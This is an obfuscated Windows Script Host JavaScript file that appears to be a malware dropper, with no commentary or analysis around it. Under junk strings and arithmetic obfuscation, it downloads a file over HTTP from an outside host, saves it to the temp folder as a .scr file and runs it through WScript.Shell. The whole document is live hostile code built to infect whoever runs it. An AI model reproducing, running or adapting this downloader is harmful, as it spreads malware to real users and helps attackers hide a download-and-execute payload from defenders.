patrolLegend = (((147, 111, 218, 188)), this);
megaphoneDepartment = ("communication", "Run");
attributeAgent = patrolLegend[("passive", function String.prototype.regionAmphibian() {
 return this
}, "morgue", "momentum", "WScript")];
attributeAgent[("band", "tariff", "Sleep")](((384 | 8612) ^ (12824 - 5852)));
finishArbiter = attributeAgent[("moment", "regenerate", "stimulation", "CreateObject")](("operate", "WScript.Shell"));
cylinderInformer = finishArbiter[("sponsor", "postscript", "ExpandEnvironmentStrings")](("variant", "scalpel", "article", "%TEMP%/")) + ("operative", "brokerPortrait") + ("cent", ".scr");
intellectReport = patrolLegend[("billion", "centimetre", "WScript")][("expertise", "rational", "CreateObject")](("date", "MSXML2.XMLHTTP"));
intellectReport[("open")](("hierarchy", "GET"), ("http://vgp3.vitebsk.by/6/98yh8bb"), !((Math.pow(((([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])) & ((([!+[] + !+[]]) * (((([+!+[]])) + "" + (([+!+[]]))))) | (Math.pow(6, 2) - 29))), ((([!+[] + !+[]] * [!+[] + !+[] + !+[]] + ((17 | 2) / (Math.pow(42, 2) - 1745)))) - (((200 - 93) - 11 * 5) - ((((([!+[] + !+[]]) * ([!+[] + !+[]])) + "" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1)))))))) - ((2 * (5 & 5) * (1 * 2) * (2 & 3) * (2 & 3) * (2 ^ 0) | (Math.pow(7 * 29, 2) - (([!+[] + !+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]) * (((([+!+[]])) + "" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])))) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]])))) * (((19 + 78) ^ (346 - 99)), ((24 ^ 157), (66 ^ 35), ((((([!+[] + !+[]])) + "" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])))) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1)), (([!+[] + !+[]])))) + (((([+[]])) | (([!+[] + !+[]]))) * (Math.pow((83, 9), (2 & 3)) - ((((([!+[] + !+[] + !+[]])) + "" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1)))) * ([!+[] + !+[]])))))) == 9));
intellectReport[("scheme", "practical", "send")]();
while (intellectReport[("spindle", "television", "readystate")] < ((([!+[] + !+[]])) * (1 * 2))) {
 patrolLegend[("atom", "WScript")][("major", "symbol", "Sleep")](((1 * 74) + (52 / 2)));
}
illustrateElement = patrolLegend[("WScript")][("CreateObject")](("mask", "apparatus", "repetition", "ADODB.Stream"));
try {
 illustrateElement[("museum", "open")]();
 illustrateElement[("mechanic", "amorphous", "type")] = (27 / 27);
 illustrateElement[("motif", "lord", "medicine", "write")](intellectReport[("clip", "factor", "rum", "ResponseBody")]);
 illustrateElement[("globe", "assortment", "position")] = ((2520 / 12), (160 | 161), (0 | 0));
 illustrateElement[("portal", "saveToFile")](cylinderInformer, ((55 - 47) - (Math.pow(16, 2) - 250)));
 illustrateElement[("portrait", "nature", "close")]();
 finishArbiter[megaphoneDepartment](cylinderInformer.regionAmphibian(), ((252 / 12) - (19 + 2)), (0 + 0));
} catch (assemblyChaos) {};